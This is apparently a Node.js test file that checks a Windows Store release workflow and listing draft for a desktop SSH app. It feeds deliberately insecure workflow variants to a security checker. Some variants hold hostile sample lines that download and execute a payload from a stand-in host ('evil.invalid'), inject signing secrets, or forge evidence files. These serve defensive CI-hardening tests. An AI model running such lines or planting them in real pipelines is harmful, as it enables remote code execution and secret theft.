import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import test from "node:test";
import {
  checkMicrosoftStoreListingDraft,
  checkWindowsStoreRelease,
  checkWindowsStoreWorkflowSecurity,
  inspectWindowsStoreWorkflowStructure,
} from "./check-windows-store-release.mjs";

const CHECKOUT_ACTION =
  "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1";
const POWERSHELL_COMMAND =
  process.platform === "win32" ? "powershell.exe" : "pwsh";

test("repository keeps the hosted-only Windows Store release contract fail-closed", () => {
  const root = resolve(import.meta.dirname, "..");
  const results = checkWindowsStoreRelease(root);
  const failures = results.filter((result) => !result.passed);

  assert.deepEqual(
    failures,
    [],
    failures.map((failure) => failure.label).join("\n"),
  );
});

test("Store listing keeps exact localized section order", () => {
  const listing = readListingDraft();
  const missingLocale = listing.replace(
    "## zh-CN Listing",
    "## Chinese Listing",
  );
  const reordered = listing
    .replace("## en-US Listing", "## listing-swap")
    .replace("## zh-CN Listing", "## en-US Listing")
    .replace("## listing-swap", "## zh-CN Listing");
  const missingAssets = listing.replace(
    "## Store Assets",
    "## Submission Images",
  );
  const missingCertification = listing.replace(
    "## Certification Notes Draft",
    "## Reviewer Notes Draft",
  );
  const missingFinalGate = listing.replace(
    "## Final Listing Gate",
    "## Submission Checklist",
  );

  for (const invalid of [
    missingLocale,
    reordered,
    missingAssets,
    missingCertification,
    missingFinalGate,
  ]) {
    assertHasFailure(
      checkMicrosoftStoreListingDraft(invalid),
      "exact ordered en-US",
    );
  }
});

test("Store listing requires four screenshots for each locale", () => {
  const listing = readListingDraft();
  const tooFewScreenshots = listing.replace(
    "four en-US and four zh-CN screenshots, eight files total.",
    "three en-US and three zh-CN screenshots, six files total.",
  );
  const missingAppearanceCoverage = listing.replace(
    "cover both light and dark appearance.",
    "cover either light or dark appearance.",
  );
  const incompleteFinalGate = listing.replace(
    "four screenshots per submitted locale and required Store art are complete;",
    "screenshots and Store art are planned;",
  );

  for (const invalid of [
    tooFewScreenshots,
    missingAppearanceCoverage,
    incompleteFinalGate,
  ]) {
    assertHasFailure(
      checkMicrosoftStoreListingDraft(invalid),
      "four screenshots for each",
    );
  }
});

test("Store listing requires reviewer SSH fixture and complete protocol steps", () => {
  const listing = readListingDraft();
  const productionFixture = listing.replace(
    "reachable, isolated, non-production SSH",
    "reachable production SSH",
  );
  const reusableCredentials = listing.replace(
    "one-time reviewer credentials",
    "shared reviewer credentials",
  );
  const missingProtocolSteps = listing.replace(
    "PTY, SFTP\n  upload/download, and loopback port forwarding",
    "a basic connection smoke test",
  );
  const unverifiedFinalGate = listing.replace(
    "temporary credentials, availability\n  window, and PTY/SFTP/forward test steps are verified",
    "credentials and test steps are planned",
  );

  for (const invalid of [
    productionFixture,
    reusableCredentials,
    missingProtocolSteps,
    unverifiedFinalGate,
  ]) {
    assertHasFailure(
      checkMicrosoftStoreListingDraft(invalid),
      "temporary reviewer credentials",
    );
  }
});

test("Store listing cannot claim GO or completed Store signing", () => {
  const listing = readListingDraft();
  const falseGo = listing.replace("still `NO-GO`", "is `GO`");
  const falseSigningClaim = listing.replace(
    "pending-microsoft-store-signing",
    "store-signed",
  );

  for (const invalid of [falseGo, falseSigningClaim]) {
    assertHasFailure(
      checkMicrosoftStoreListingDraft(invalid),
      "NO-GO with pending",
    );
  }
});

test("workflow contract rejects any third job", () => {
  const workflow = readWorkflow();
  const insecure = workflow.replace(
    "\n  verify:\n",
    `
  unexpected:
    runs-on: windows-2025
    steps:
      - run: Write-Output "unexpected"

  verify:
`,
  );

  assertHasFailure(
    checkWindowsStoreWorkflowSecurity(insecure),
    "YAML structure",
  );
});

test("policy job cannot checkout or execute repository tools", () => {
  const workflow = readWorkflow();
  const checkout = workflow.replace(
    "    steps:\n      - name: Validate hosted candidate inputs",
    `    steps:
      - uses: ${CHECKOUT_ACTION}
      - name: Validate hosted candidate inputs`,
  );
  const npm = workflow.replace(
    "          Set-StrictMode -Version Latest\n\n          if (\n            $env:DISPATCH_REF",
    "          Set-StrictMode -Version Latest\n          npm run qa:windows-store-release\n\n          if (\n            $env:DISPATCH_REF",
  );

  for (const insecure of [checkout, npm]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "never checks out or executes repository code",
    );
  }
});

test("policy job rejects extra steps and mutations to reviewed policy code", () => {
  const workflow = readWorkflow();
  const extraStep = workflow.replace(
    "\n  verify:\n",
    `
      - name: Execute remote payload
        shell: pwsh
        run: Invoke-Expression (Invoke-WebRequest 'https://evil.invalid/payload').Content

  verify:
`,
  );
  const mutatedRun = workflow.replace(
    '          "legal_publisher=$legalPublisher" >> $env:GITHUB_OUTPUT',
    `          "legal_publisher=$legalPublisher" >> $env:GITHUB_OUTPUT
          Invoke-Expression (Invoke-WebRequest 'https://evil.invalid/payload').Content`,
  );

  for (const insecure of [extraStep, mutatedRun]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "exact reviewed steps",
    );
  }
});

test("verify job rejects environment, OIDC, and every secret expression", () => {
  const workflow = readWorkflow();
  const environment = workflow.replace(
    "    timeout-minutes: 90\n    permissions:",
    "    timeout-minutes: 90\n    environment: windows-release-stage-b\n    permissions:",
  );
  const oidc = workflow.replace(
    "    permissions:\n      contents: read\n    env:\n      ATLASTERM_WINDOWS_CANDIDATE_FORMAT:",
    "    permissions:\n      contents: read\n      id-token: write\n    env:\n      ATLASTERM_WINDOWS_CANDIDATE_FORMAT:",
  );
  const secret = workflow.replace(
    "      JOESSH_WINDOWS_RELEASE_ENVIRONMENT: windows-release-stage-b",
    "      JOESSH_WINDOWS_RELEASE_ENVIRONMENT: windows-release-stage-b\n      SIGNING_SECRET: ${{ secrets.SIGNING_SECRET }}",
  );

  for (const insecure of [environment, oidc, secret]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "no environment, OIDC, or secrets",
    );
  }
});

test("workflow rejects inherited root env, bracket secrets, and github.token", () => {
  const workflow = readWorkflow();
  const inheritedRootSecret = workflow.replace(
    "\npermissions:\n  contents: read\n\njobs:",
    `
env:
  SIGNING_SECRET: \${{ secrets.SIGNING_SECRET }}

permissions:
  contents: read

jobs:`,
  );
  const inheritedShell = workflow.replace(
    "\npermissions:\n  contents: read\n\njobs:",
    `
defaults:
  run:
    shell: pwsh -Command "Invoke-WebRequest https://evil.invalid/payload; {0}"

permissions:
  contents: read

jobs:`,
  );
  const bracketSecret = workflow.replace(
    "      - name: Pin npm 10.9.7\n        shell: bash",
    `      - name: Pin npm 10.9.7
        env:
          SIGNING_SECRET: \${{ secrets['SIGNING_SECRET'] }}
        shell: bash`,
  );
  const dynamicSecret = workflow.replace(
    "      - name: Pin npm 10.9.7\n        shell: bash",
    `      - name: Pin npm 10.9.7
        env:
          SIGNING_SECRET: \${{ secrets[inputs.secret_name] }}
        shell: bash`,
  );
  const githubToken = workflow.replace(
    "      - name: Pin npm 10.9.7\n        shell: bash",
    `      - name: Pin npm 10.9.7
        env:
          GH_TOKEN: \${{ github.token }}
        shell: bash`,
  );

  assertHasFailure(
    checkWindowsStoreWorkflowSecurity(inheritedRootSecret),
    "root metadata is exact",
  );
  assertHasFailure(
    checkWindowsStoreWorkflowSecurity(inheritedShell),
    "root metadata is exact",
  );
  for (const insecure of [bracketSecret, dynamicSecret, githubToken]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "no environment, OIDC, or secrets",
    );
  }
});

test("workflow rejects self-hosted runners", () => {
  const workflow = readWorkflow();
  const insecure = workflow.replace(
    "  verify:\n    name: Verify hosted ${{ needs.policy.outputs.candidate_format }} without signing authority\n    needs: policy\n    if: needs.policy.result == 'success'\n    runs-on: windows-2025",
    "  verify:\n    name: Verify hosted ${{ needs.policy.outputs.candidate_format }} without signing authority\n    needs: policy\n    if: needs.policy.result == 'success'\n    runs-on: [self-hosted, windows]",
  );

  assertHasFailure(
    checkWindowsStoreWorkflowSecurity(insecure),
    "only GitHub-hosted Windows runners",
  );
});

test("workflow rejects local artifact and handoff paths", () => {
  const workflow = readWorkflow();
  const localArtifact = workflow.replace(
    "            --download-url $env:ARTIFACT_URL `",
    "            --artifact reports/handoff/windows-store/JoeSSH.exe `",
  );
  const localHandoff = workflow.replace(
    "      - name: Preflight hosted EXE\n",
    `      - name: Import local handoff
        run: Write-Output "reports/handoff/windows-store"

      - name: Preflight hosted EXE
`,
  );

  for (const insecure of [localArtifact, localHandoff]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "hosted URL/hash only",
    );
  }
});

test("workflow rejects floating, missing-ref, unexpected, and Docker actions", () => {
  const workflow = readWorkflow();
  const floating = workflow.replace(CHECKOUT_ACTION, "actions/checkout@main");
  const missingRef = workflow.replace(CHECKOUT_ACTION, "actions/checkout");
  const unreviewedCommit = workflow.replace(
    CHECKOUT_ACTION,
    `actions/checkout@${"a".repeat(40)}`,
  );
  const unexpected = workflow.replace(
    "    steps:\n      - name: Validate hosted candidate inputs",
    `    steps:
      - uses: actions/cache@5a3ec84eff668545956fd18022155c47e93e2684
      - name: Validate hosted candidate inputs`,
  );
  const docker = workflow.replace(
    "    steps:\n      - name: Validate hosted candidate inputs",
    `    steps:
      - uses: docker://alpine@sha256:${"a".repeat(64)}
      - name: Validate hosted candidate inputs`,
  );

  for (const insecure of [
    floating,
    missingRef,
    unreviewedCommit,
    unexpected,
    docker,
  ]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "exact allowlist pinned to full commit SHAs",
    );
  }
});

test("workflow rejects mutable container images", () => {
  const workflow = readWorkflow();
  const insecure = workflow.replace(
    "    timeout-minutes: 30",
    "    timeout-minutes: 30\n    container: mcr.microsoft.com/windows/servercore:ltsc2025",
  );

  assertHasFailure(
    checkWindowsStoreWorkflowSecurity(insecure),
    "mutable container images",
  );
});

test("artifact_url and expected_sha256 can never become optional", () => {
  const workflow = readWorkflow();
  const optionalUrl = workflow.replace(
    '      artifact_url:\n        description: "SHA-bound HTTPS transfer URL; EXE must also be immutable and versioned."\n        required: true',
    '      artifact_url:\n        description: "SHA-bound HTTPS transfer URL; EXE must also be immutable and versioned."\n        required: false',
  );
  const optionalHash = workflow.replace(
    '      expected_sha256:\n        description: "Exact SHA-256 of the hosted EXE or MSIX."\n        required: true',
    '      expected_sha256:\n        description: "Exact SHA-256 of the hosted EXE or MSIX."\n        required: false',
  );

  for (const insecure of [optionalUrl, optionalHash]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "require artifact_url and expected_sha256",
    );
  }
});

test("candidate format remains MSIX-first", () => {
  const workflow = readWorkflow();
  const exeDefault = workflow.replace(
    "        default: msix\n        type: choice",
    "        default: exe\n        type: choice",
  );
  const exeFirst = workflow.replace(
    "        options:\n          - msix\n          - exe",
    "        options:\n          - exe\n          - msix",
  );

  for (const insecure of [exeDefault, exeFirst]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "defaults to MSIX",
    );
  }
});

test("EXE fallback justification stays bounded and MSIX requires it empty", () => {
  const workflow = readWorkflow();
  const unboundedExeReason = workflow.replace(
    "$fallbackJustification.Length -lt 40",
    "$fallbackJustification.Length -lt 0",
  );
  const placeholderAllowed = workflow.replace(
    '$fallbackJustification -match "(?i:\\A(?:(?:change[-_ ]?me|example|placeholder|todo|tbd|unknown|not[-_ ]?set|lorem|ipsum|n/?a|none|test)[\\s.,;:_-]*)+\\z|<[^>]+>)"',
    '$fallbackJustification -match "(?i:\\A\\z)"',
  );
  const msixReasonAllowed = workflow.replace(
    '$env:MSIX_FALLBACK_JUSTIFICATION_INPUT -cne ""',
    "$false",
  );

  for (const insecure of [
    unboundedExeReason,
    placeholderAllowed,
    msixReasonAllowed,
  ]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "bounded EXE fallback justification",
    );
  }
});

test("MSIX policy cannot read or invent EXE certificate identity", () => {
  const workflow = readWorkflow();
  const unconditionalCertificate = workflow.replace(
    'if ($env:CANDIDATE_FORMAT -ceq "exe") {',
    "if ($true) {",
  );
  const inventedCertificate = workflow.replace(
    '          $subject = ""\n          $thumbprint = ""',
    '          $subject = "CN=placeholder"\n          $thumbprint = "0000000000000000000000000000000000000000"',
  );
  const impreciseExeCertificate = workflow.replace(
    "$commonNames.Count -ne 1",
    "$commonNames.Count -lt 0",
  );

  for (const insecure of [
    unconditionalCertificate,
    inventedCertificate,
    impreciseExeCertificate,
  ]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "only legal publisher for MSIX",
    );
  }
});

test("verification and evidence cannot erase the MSIX-first decision", () => {
  const workflow = readWorkflow();
  const unreviewedBranch = workflow.replace(
    "        if: needs.policy.outputs.candidate_format == 'msix'",
    "        if: inputs.candidate_format == 'msix'",
  );
  const unconditionalCertificateEvidence = workflow.replace(
    "          if ($isMsixFallback) {",
    "          if ($true) {",
  );
  const erasedFallbackReason = workflow.replace(
    "              msixFallbackJustification = $env:MSIX_FALLBACK_JUSTIFICATION",
    '              msixFallbackJustification = ""',
  );
  const msixCertificateAllowlist = workflow.replace(
    '            @("legalPublisher")',
    '            @("certificateSubject", "certificateThumbprint", "legalPublisher")',
  );

  assertHasFailure(
    checkWindowsStoreWorkflowSecurity(unreviewedBranch),
    "hosted URL/hash only",
  );
  for (const insecure of [
    unconditionalCertificateEvidence,
    erasedFallbackReason,
    msixCertificateAllowlist,
  ]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "record the MSIX-first choice",
    );
  }
});

test("EXE evidence keeps exact certificate subject and thumbprint checks", () => {
  const workflow = readWorkflow();
  const uncheckedSubject = workflow.replace(
    "$candidate.verification.installerSignature.signerSubject -cne $env:ATLASTERM_WINDOWS_CERTIFICATE_SUBJECT",
    "$false",
  );
  const uncheckedThumbprint = workflow.replace(
    "$candidate.verification.signerPolicy.expectedThumbprint,",
    '"unchecked-thumbprint",',
  );

  for (const insecure of [uncheckedSubject, uncheckedThumbprint]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "format-conditional identity",
    );
  }
});

test("policy has only the read-only policy token", () => {
  const workflow = readWorkflow();
  const extraSecret = workflow.replace(
    "          REPOSITORY: ${{ github.repository }}",
    "          REPOSITORY: ${{ github.repository }}\n          EXTRA_SECRET: ${{ secrets.EXTRA_SECRET }}",
  );
  const bracketToken = workflow.replace(
    "${{ secrets.ATLASTERM_RELEASE_POLICY_READ_TOKEN }}",
    "${{ secrets['ATLASTERM_RELEASE_POLICY_READ_TOKEN'] }}",
  );

  for (const insecure of [extraSecret, bracketToken]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "only the read-only policy token",
    );
  }
});

test("verify checkout must stay bound to the reviewed policy output", () => {
  const workflow = readWorkflow();
  const insecure = workflow.replace(
    "          ref: ${{ needs.policy.outputs.reviewed_sha }}",
    "          ref: ${{ github.sha }}",
  );

  assertHasFailure(
    checkWindowsStoreWorkflowSecurity(insecure),
    "exact reviewed SHA",
  );
});

test("verify dependencies require ignore-scripts and exact toolchains", () => {
  const workflow = readWorkflow();
  const lifecycleScripts = workflow.replace(
    "npm ci --ignore-scripts --no-audit --no-fund",
    "npm ci --no-audit --no-fund",
  );
  const floatingNode = workflow.replace(
    "node-version: 22.22.2",
    "node-version: 22",
  );
  const floatingRust = workflow.replace(
    "toolchain: 1.96.0",
    "toolchain: stable",
  );

  for (const insecure of [lifecycleScripts, floatingNode, floatingRust]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "exact toolchains and ignore-scripts",
    );
  }
});

test("workflow requires legal resources, exact SBOMs, Store surface, and pending MSIX semantics", () => {
  const workflow = readWorkflow();
  const missingLegal = workflow.replace(
    "npm run release:desktop:legal-resource",
    "Write-Output skipped-legal",
  );
  const missingSbom = workflow.replaceAll(
    "reports/release/npm-web-sbom.cdx.json",
    "reports/release/unreviewed-web-sbom.cdx.json",
  );
  const missingSurface = workflow.replace(
    "npm run qa:windows-store-surfaces:runtime",
    "Write-Output skipped-surface",
  );
  const falseSigningClaim = workflow.replace(
    "pending-microsoft-store-signing",
    "store-signed",
  );

  for (const insecure of [
    missingLegal,
    missingSbom,
    missingSurface,
    falseSigningClaim,
  ]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "rechecks hosted bytes, identity, legal resources, SBOMs, and Store surface",
    );
  }
});

test("hosted recheck requires exact bundled third-party notices evidence", () => {
  const workflow = readWorkflow();
  const missingGate = workflow.replace(
    "$candidate.gates.thirdPartyNoticesBundled -ne $true -or",
    "$false -or",
  );
  const wrongPath = workflow.replace(
    '$candidate.verification.bundledThirdPartyNotices.path -cne "legal/THIRD-PARTY-NOTICES.txt" -or',
    '$candidate.verification.bundledThirdPartyNotices.path -cne "legal/OTHER.txt" -or',
  );
  const unboundPath = workflow.replace(
    "$candidate.verification.bundledThirdPartyNotices.path -cne $candidate.legalNotices.bundleResourcePath -or",
    "$false -or",
  );
  const wrongStatus = workflow.replace(
    '$candidate.verification.bundledThirdPartyNotices.status -cne "exact-match" -or',
    '$candidate.verification.bundledThirdPartyNotices.status -cne "unchecked" -or',
  );
  const uncheckedSize = workflow.replace(
    "$candidate.verification.bundledThirdPartyNotices.sizeBytes -ne $noticeSizeBytes -or",
    "$false -or",
  );
  const unboundSize = workflow.replace(
    "$candidate.verification.bundledThirdPartyNotices.sizeBytes -ne $candidate.legalNotices.sizeBytes -or",
    "$false -or",
  );
  const uncheckedSha256 = workflow.replace(
    "$candidate.verification.bundledThirdPartyNotices.sha256 -cne $noticeSha256 -or",
    "$false -or",
  );
  const unboundSha256 = workflow.replace(
    "$candidate.verification.bundledThirdPartyNotices.sha256 -cne $candidate.legalNotices.sha256 -or",
    "$false -or",
  );

  for (const insecure of [
    missingGate,
    wrongPath,
    unboundPath,
    wrongStatus,
    uncheckedSize,
    unboundSize,
    uncheckedSha256,
    unboundSha256,
  ]) {
    assert.notEqual(insecure, workflow);
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "rechecks hosted bytes, identity, legal resources, SBOMs, and Store surface",
    );
  }
});

test("verify rejects post-recheck and pre-upload evidence tampering steps", () => {
  const workflow = readWorkflow();
  const afterRecheck = workflow.replace(
    "\n      - name: Remove transient Partner Center identity\n",
    `
      - name: Forge evidence after recheck
        shell: pwsh
        run: Set-Content reports/release/windows-store/evil.txt forged

      - name: Remove transient Partner Center identity
`,
  );
  const beforeUpload = workflow.replace(
    "\n      - name: Upload hosted candidate verification evidence\n",
    `
      - name: Mutate evidence before upload
        shell: pwsh
        run: Add-Content reports/release/windows-store/evil.txt forged

      - name: Upload hosted candidate verification evidence
`,
  );

  for (const insecure of [afterRecheck, beforeUpload]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "exact ordered reviewed step contract",
    );
  }
});

test("verify cannot drop pre/post execution source and surface baselines", () => {
  const workflow = readWorkflow();
  const missingBaselineOutput = workflow.replace(
    '"surface_tree_sha256=$(Get-PathSetDigest $surfacePaths)" >> $env:GITHUB_OUTPUT',
    '"surface_tree_sha256=unchecked" >> $env:GITHUB_OUTPUT',
  );
  const missingPostExecutionCheck = workflow.replace(
    "$actualCommit -cne $env:BASELINE_SOURCE_SHA -or",
    "$false -or",
  );

  for (const insecure of [missingBaselineOutput, missingPostExecutionCheck]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "rechecks hosted bytes, identity, legal resources, SBOMs, and Store surface",
    );
  }
});

test("policy markers cannot be satisfied by comments or literal dead code", () => {
  const workflow = readWorkflow();
  const commentSpoof = workflow.replace(
    "$environment.can_admins_bypass -ne $false -or",
    "$environment.unchecked_admin_bypass -ne $false -or\n            # $environment.can_admins_bypass -ne $false -or",
  );
  const deadCodeSpoof = workflow.replace(
    '          $environment = Get-GitHubJson "/repos/$($env:REPOSITORY)/environments/windows-release-stage-b"',
    '          if ($false) {\n            Write-Output "required_reviewers can_admins_bypass -ne $false"\n          }\n          $environment = Get-GitHubJson "/repos/$($env:REPOSITORY)/environments/windows-release-stage-b"',
  );

  for (const insecure of [commentSpoof, deadCodeSpoof]) {
    assertHasFailure(
      checkWindowsStoreWorkflowSecurity(insecure),
      "exact live direct-main",
    );
  }
});

test("live policy accepts an omitted bypass field only for user-owned repositories", () => {
  const personal = runLivePolicy({ ownerType: "User" });
  assert.equal(personal.status, 0, commandOutput(personal));

  for (const ownerType of ["Organization", null]) {
    const result = runLivePolicy({ ownerType });
    assert.notEqual(result.status, 0, commandOutput(result));
  }
});

test("live policy rejects null and non-empty bypass allowances", () => {
  for (const ownerType of ["User", "Organization", null]) {
    const result = runLivePolicy({ bypassAllowances: null, ownerType });
    assert.notEqual(result.status, 0, commandOutput(result));
    assert.match(
      commandOutput(result),
      /Bypass allowances must be an object when present/,
    );
  }

  const nonEmpty = runLivePolicy({
    bypassAllowances: {
      apps: [],
      teams: [],
      users: [{ id: 1, login: "release-admin" }],
    },
    ownerType: "Organization",
  });
  assert.notEqual(nonEmpty.status, 0, commandOutput(nonEmpty));
  assert.match(
    commandOutput(nonEmpty),
    /Direct classic main protection does not match the release contract/,
  );
});

test("live policy accepts explicit empty bypass actor arrays", () => {
  const result = runLivePolicy({
    bypassAllowances: {
      apps: [],
      teams: [],
      users: [],
    },
    ownerType: "Organization",
  });

  assert.equal(result.status, 0, commandOutput(result));
});

function runLivePolicy({ bypassAllowances, ownerType } = {}) {
  const workflow = inspectWindowsStoreWorkflowStructure(readWorkflow());
  const livePolicyRun = workflow.jobs.policy.steps.find(
    (step) =>
      step.name ===
      "Read live direct main, environment, and format identity policy",
  )?.run;
  assert.equal(typeof livePolicyRun, "string");

  const repositoryMetadata = {
    owner: ownerType === null ? {} : { type: ownerType ?? "User" },
  };
  const protection = {
    allow_deletions: { enabled: false },
    allow_force_pushes: { enabled: false },
    enforce_admins: { enabled: true },
    required_pull_request_reviews: {
      require_last_push_approval: true,
      required_approving_review_count: 1,
    },
    required_status_checks: {
      checks: [{ app_id: 15368, context: "Public Release Readiness" }],
      strict: true,
    },
  };
  if (bypassAllowances !== undefined) {
    protection.required_pull_request_reviews.bypass_pull_request_allowances =
      bypassAllowances;
  }

  const environment = {
    can_admins_bypass: false,
    deployment_branch_policy: {
      custom_branch_policies: false,
      protected_branches: true,
    },
    name: "windows-release-stage-b",
    protection_rules: [
      {
        prevent_self_review: true,
        reviewers: [{ reviewer: { id: 1 }, type: "User" }],
        type: "required_reviewers",
      },
    ],
  };
  const wrapper = `
function Invoke-RestMethod {
  param([object] $Headers, [string] $Method, [string] $Uri)
  if ($Uri -ceq "https://api.github.com/repos/$($env:REPOSITORY)") {
    return $env:MOCK_REPOSITORY_METADATA | ConvertFrom-Json
  }
  if ($Uri -ceq "https://api.github.com/repos/$($env:REPOSITORY)/environments/windows-release-stage-b") {
    return $env:MOCK_ENVIRONMENT | ConvertFrom-Json
  }
  if ($Uri -ceq "https://api.github.com/repos/$($env:REPOSITORY)/branches/main/protection") {
    return $env:MOCK_PROTECTION | ConvertFrom-Json
  }
  if ($Uri -ceq "https://api.github.com/repos/$($env:REPOSITORY)/environments/windows-release-stage-b/variables/ATLASTERM_WINDOWS_LEGAL_PUBLISHER") {
    return $env:MOCK_LEGAL_PUBLISHER | ConvertFrom-Json
  }
  throw "Unexpected mock API URI: $Uri"
}
${livePolicyRun}
`;
  const root = mkdtempSync(join(tmpdir(), "windows-store-live-policy-"));
  try {
    return spawnSync(
      POWERSHELL_COMMAND,
      ["-NoLogo", "-NoProfile", "-NonInteractive", "-Command", wrapper],
      {
        encoding: "utf8",
        env: {
          ...process.env,
          CANDIDATE_FORMAT: "msix",
          GITHUB_OUTPUT: join(root, "github-output.txt"),
          MOCK_ENVIRONMENT: JSON.stringify(environment),
          MOCK_LEGAL_PUBLISHER: JSON.stringify({
            name: "ATLASTERM_WINDOWS_LEGAL_PUBLISHER",
            value: "JoeWorkspace",
          }),
          MOCK_PROTECTION: JSON.stringify(protection),
          MOCK_REPOSITORY_METADATA: JSON.stringify(repositoryMetadata),
          POLICY_READ_TOKEN: "fixture-read-token",
          REPOSITORY: "JoeWorkspace/JoeSSH",
        },
        timeout: 30_000,
      },
    );
  } finally {
    rmSync(root, { force: true, recursive: true });
  }
}

function commandOutput(result) {
  return [result.stdout, result.stderr, result.error?.message]
    .filter(Boolean)
    .join("\n");
}

function readWorkflow() {
  return readFileSync(
    resolve(
      import.meta.dirname,
      "..",
      ".github/workflows/windows-store-candidate.yml",
    ),
    "utf8",
  ).replace(/^\uFEFF/u, "");
}

function readListingDraft() {
  return readFileSync(
    resolve(import.meta.dirname, "..", "docs/microsoft-store-listing-draft.md"),
    "utf8",
  ).replace(/^\uFEFF/u, "");
}

function assertHasFailure(results, labelFragment) {
  assert.ok(
    results.some(
      (result) =>
        !result.passed &&
        result.label.toLowerCase().includes(labelFragment.toLowerCase()),
    ),
    `Expected a failing result containing "${labelFragment}".`,
  );
}
